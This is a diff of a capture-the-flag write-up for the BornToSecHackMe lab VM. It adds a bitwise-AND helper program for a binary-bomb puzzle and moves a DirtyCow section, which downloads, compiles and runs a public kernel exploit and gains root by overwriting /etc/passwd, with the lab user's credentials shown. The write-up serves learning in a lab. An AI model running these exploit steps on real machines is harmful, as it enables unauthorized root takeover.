@@ -532,6 +532,7 @@ The bomb has blown up.
 laurie@BornToSecHackMe:~$
 ```
 
+At this point we can take up the system by exploiting Dirty Cow: see [[#The First Alternative DirtyCow]].
 ### The Bomb
 
 I transfer the file to my session to analyze it:
@@ -793,7 +794,6 @@ I tested with a program coded for this purpose:
 win!55
 
 ┌──(fab㉿kali)-[~]
-└─$ ┌──(fab㉿kali)-[~]
 └─$ cat gatto.c
 #include <stdio.h>
 
@@ -812,7 +812,6 @@ int func4(int param_1)
   }
   return iVar2;
 }
-
 
 int main(int ac, char *av[]) {
         if (ac != 2)
@@ -872,26 +871,25 @@ void phase_5(char *param_1)
 }
 ```
 
-
-
-
-
-And my program:
-```c
+For this purpose I coded a program allowing me to find all the numbers between 0 and 255 that ANDed with each one of the given numbers gave as a result the same numbers:
+```shell
+faventur@k2r2p1:~ $ cat ha.c   
 #include <stdio.h>
 #include <string.h>
 
 int     happy_anding(int c) {
         int i = 0;
+        int res = -1;
         while (i <= 255) {
                 int lettre = i & 15;
                 if (lettre == c) {
-                        printf("bin: %d", lettre);
-                        return lettre;
+                        printf("The result is: %d\n", lettre);
+                        printf("i is: %d\n", i);
+                        res = lettre;
                 }
                 i++;
         }
-        return -1;
+        return res;
 }
 
 int     main() {
@@ -900,18 +898,213 @@ int     main() {
         int i = 0;
         while (i < 6) {
                 int lettre = happy_anding(array[i]);
-                if (lettre == -1)
-                        return 1;
                 printf("letters: %d\n", lettre);
                 i++;
         }
 }
+
+faventur@k2r2p1:~ $ gcc ha.c
+faventur@k2r2p1:~ $ ./a.out   
+The result is: 15
+i is: 15
+The result is: 15
+i is: 31
+The result is: 15
+i is: 47
+The result is: 15
+i is: 63
+The result is: 15
+i is: 79
+The result is: 15
+i is: 95
+The result is: 15
+i is: 111
+The result is: 15
+i is: 127
+The result is: 15
+i is: 143
+The result is: 15
+i is: 159
+The result is: 15
+i is: 175
+The result is: 15
+i is: 191
+The result is: 15
+i is: 207
+The result is: 15
+i is: 223
+The result is: 15
+i is: 239
+The result is: 15
+i is: 255
+letters: 15
+The result is: 0
+i is: 0
+The result is: 0
+i is: 16
+The result is: 0
+i is: 32
+The result is: 0
+i is: 48
+The result is: 0
+i is: 64
+The result is: 0
+i is: 80
+The result is: 0
+i is: 96
+The result is: 0
+i is: 112
+The result is: 0
+i is: 128
+The result is: 0
+i is: 144
+The result is: 0
+i is: 160
+The result is: 0
+i is: 176
+The result is: 0
+i is: 192
+The result is: 0
+i is: 208
+The result is: 0
+i is: 224
+The result is: 0
+i is: 240
+letters: 0
+The result is: 5
+i is: 5
+The result is: 5
+i is: 21
+The result is: 5
+i is: 37
+The result is: 5
+i is: 53
+The result is: 5
+i is: 69
+The result is: 5
+i is: 85
+The result is: 5
+i is: 101
+The result is: 5
+i is: 117
+The result is: 5
+i is: 133
+The result is: 5
+i is: 149
+The result is: 5
+i is: 165
+The result is: 5
+i is: 181
+The result is: 5
+i is: 197
+The result is: 5
+i is: 213
+The result is: 5
+i is: 229
+The result is: 5
+i is: 245
+letters: 5
+The result is: 11
+i is: 11
+The result is: 11
+i is: 27
+The result is: 11
+i is: 43
+The result is: 11
+i is: 59
+The result is: 11
+i is: 75
+The result is: 11
+i is: 91
+The result is: 11
+i is: 107
+The result is: 11
+i is: 123
+The result is: 11
+i is: 139
+The result is: 11
+i is: 155
+The result is: 11
+i is: 171
+The result is: 11
+i is: 187
+The result is: 11
+i is: 203
+The result is: 11
+i is: 219
+The result is: 11
+i is: 235
+The result is: 11
+i is: 251
+letters: 11
+The result is: 13
+i is: 13
+The result is: 13
+i is: 29
+The result is: 13
+i is: 45
+The result is: 13
+i is: 61
+The result is: 13
+i is: 77
+The result is: 13
+i is: 93
+The result is: 13
+i is: 109
+The result is: 13
+i is: 125
+The result is: 13
+i is: 141
+The result is: 13
+i is: 157
+The result is: 13
+i is: 173
+The result is: 13
+i is: 189
+The result is: 13
+i is: 205
+The result is: 13
+i is: 221
+The result is: 13
+i is: 237
+The result is: 13
+i is: 253
+letters: 13
+The result is: 1
+i is: 1
+The result is: 1
+i is: 17
+The result is: 1
+i is: 33
+The result is: 1
+i is: 49
+The result is: 1
+i is: 65
+The result is: 1
+i is: 81
+The result is: 1
+i is: 97
+The result is: 1
+i is: 113
+The result is: 1
+i is: 129
+The result is: 1
+i is: 145
+The result is: 1
+i is: 161
+The result is: 1
+i is: 177
+The result is: 1
+i is: 193
+The result is: 1
+i is: 209
+The result is: 1
+i is: 225
+The result is: 1
+i is: 241
+letters: 1
+faventur@k2r2p1:~ $ 
 ```
-
-
-
-
-
 And finally the function `phase_6`:
 ```c
 void phase_6(char *param_1)
@@ -1598,6 +1791,61 @@ with Thunderbird. To do this, we add `borntosec.net` to our `/etc/hosts` file:
 
 
 
+### The First Alternative: DirtyCow
+
+As laurie, with the credentials:
+```
+laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+```
+we can launch LinPEAS:
+```
+┌──(fab㉿kali)-[~]
+└─$ wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
+
+┌──(fab㉿kali)-[~]
+└─$ scp dirty.c laurie@192.168.56.101:~
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+laurie@192.168.56.101's password:
+dirty.c                                                                               100% 4815     1.4MB/s   00:00
+
+┌──(fab㉿kali)-[~]
+└─$
+```
+Once the `.c` file is in the remote system, we can compile and execute it with a password of our choice:
+```
+laurie@BornToSecHackMe:~$ ls
+bomb  dirty.c  README
+laurie@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
+laurie@BornToSecHackMe:~$ ls
+bomb  dirty  dirty.c  README
+laurie@BornToSecHackMe:~$ chmod +x dirty
+laurie@BornToSecHackMe:~$ ./dirty swag
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: swag
+Complete line:
+firefart:fii3KM0hiSg7s:0:0:pwned:/root:/bin/bash
+
+mmap: b7fda000
+^C
+laurie@BornToSecHackMe:~$ su firefart
+Password:
+firefart@BornToSecHackMe:/home/laurie# whoami
+firefart
+firefart@BornToSecHackMe:/home/laurie# cd /root
+firefart@BornToSecHackMe:~# ls
+README
+firefart@BornToSecHackMe:~# cat README
+CONGRATULATIONS !!!!
+To be continued...
+firefart@BornToSecHackMe:~#
+```
 ### Failed Attempts
 #### Get Root from MySQL - A Dead End
 
@@ -1654,61 +1902,4 @@ raptor_udf2.so                                                                  
 
 ┌──(fab㉿kali)-[~]
 └─$
-```
-
-### The First Alternative: DirtyCow
-
-As laurie, with the credentials:
-```
-laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
-```
-we can launch LinPEAS:
-
-```
-┌──(fab㉿kali)-[~]
-└─$ wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
-
-┌──(fab㉿kali)-[~]
-└─$ scp dirty.c laurie@192.168.56.101:~
-        ____                _______    _____
-       |  _ \              |__   __|  / ____|
-       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
-       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
-       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
-       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
-
-                       Good luck & Have fun
-laurie@192.168.56.101's password:
-dirty.c                                                                               100% 4815     1.4MB/s   00:00
-
-┌──(fab㉿kali)-[~]
-└─$
-```
-And in the remote system:
-```
-laurie@BornToSecHackMe:~$ ls
-bomb  dirty.c  README
-laurie@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
-laurie@BornToSecHackMe:~$ ls
-bomb  dirty  dirty.c  README
-laurie@BornToSecHackMe:~$ chmod +x dirty
-laurie@BornToSecHackMe:~$ ./dirty swag
-/etc/passwd successfully backed up to /tmp/passwd.bak
-Please enter the new password: swag
-Complete line:
-firefart:fii3KM0hiSg7s:0:0:pwned:/root:/bin/bash
-
-mmap: b7fda000
-^C
-laurie@BornToSecHackMe:~$ su firefart
-Password:
-firefart@BornToSecHackMe:/home/laurie# whoami
-firefart
-firefart@BornToSecHackMe:/home/laurie# cd /root
-firefart@BornToSecHackMe:~# ls
-README
-firefart@BornToSecHackMe:~# cat README
-CONGRATULATIONS !!!!
-To be continued...
-firefart@BornToSecHackMe:~#
 ```
